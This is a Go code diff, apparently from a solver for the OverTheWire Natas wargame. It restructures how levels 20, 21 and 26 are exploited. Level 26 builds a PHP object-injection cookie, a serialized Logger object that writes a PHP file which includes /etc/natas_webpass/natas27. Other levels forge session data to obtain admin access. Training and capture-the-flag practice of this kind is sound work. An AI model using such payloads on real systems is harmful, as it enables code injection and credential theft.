@@ -433,6 +433,15 @@ func (r RangeHex) ID() string {
 	return hex.EncodeToString([]byte(r.Range.ID()))
 }
 
+type LoadAll []Grabber
+
+func (l LoadAll) Grab(r http.Request) string {
+	for _, g := range l[:len(l)-1] {
+		g.Grab(r)
+	}
+	return l[len(l)-1].Grab(r)
+}
+
 var levels = [...]Grabber{
 	//level 0
 	Prefixed{grab, "The password for natas1 is ", 32},
@@ -629,14 +638,9 @@ var levels = [...]Grabber{
 	},
 	//level 20
 	Headers{
-		Prefixed{
-			grab,
-			"Password: ",
-			32,
-		},
-		SetData{
-			"Cookie": Text{"PHPSESSID=1"},
-			"Upgrade-Insecure-Requests": Post{ // hack to send data before reloading page
+		LoadAll{
+
+			Post{
 				Headers{
 					Contains{
 						grab,
@@ -649,25 +653,23 @@ var levels = [...]Grabber{
 				},
 				nil,
 			},
+			Prefixed{
+				grab,
+				"Password: ",
+				32,
+			},
 		},
+		SetData{"Cookie": Text{"PHPSESSID=1"}},
 	},
 	//level 21
 	Headers{
-		Prefixed{
-			grab,
-			"Password: ",
-			32,
-		},
-		SetData{
-			"Cookie": Text{"PHPSESSID=1"},
-			"Upgrade-Insecure-Requests": Host{
+		LoadAll{
+
+			Host{
 				Get{
 					Post{
 						Headers{
-							Contains{
-								grab,
-								"[admin]",
-							},
+							grab,
 							SetData{"Cookie": Text{"PHPSESSID=1"}},
 						},
 						SetData{
@@ -680,7 +682,13 @@ var levels = [...]Grabber{
 				},
 				Text{"natas21-experimenter.natas.labs.overthewire.org"},
 			},
+			Prefixed{
+				grab,
+				"Password: ",
+				32,
+			},
 		},
+		SetData{"Cookie": Text{"PHPSESSID=1"}},
 	},
 	//level 22
 	Get{
@@ -738,7 +746,16 @@ var levels = [...]Grabber{
 		},
 	},
 	//level 26
-	Headers{
+	LoadAll{
+		Headers{
+			grab,
+			SetData{
+				"Cookie": Combine{
+					Text{"drawing="},
+					Base64Encode{Text{"O:6:\"Logger\":3:{s:15:\"\x00Logger\x00logFile\";s:20:\"img/the-password.php\";s:15:\"\x00Logger\x00initMsg\";s:0:\"\";s:15:\"\x00Logger\x00exitMsg\";s:64:\"<?php echo \"Password: \";include(\"/etc/natas_webpass/natas27\");?>\";}"}},
+				},
+			},
+		},
 		Path{
 			Prefixed{
 				grab,
@@ -746,20 +763,6 @@ var levels = [...]Grabber{
 				32,
 			},
 			Text{"/img/the-password.php"},
-		},
-		SetData{
-			"Upgrade-Insecure-Requests": Contains{
-				Headers{
-					grab,
-					SetData{
-						"Cookie": Combine{
-							Text{"drawing="},
-							Base64Encode{Text{"O:6:\"Logger\":3:{s:15:\"\x00Logger\x00logFile\";s:20:\"img/the-password.php\";s:15:\"\x00Logger\x00initMsg\";s:0:\"\";s:15:\"\x00Logger\x00exitMsg\";s:64:\"<?php echo \"Password: \";include(\"/etc/natas_webpass/natas27\");?>\";}"}},
-						},
-					},
-				},
-				"Cannot use object of type Logger as array",
-			},
 		},
 	},
 }
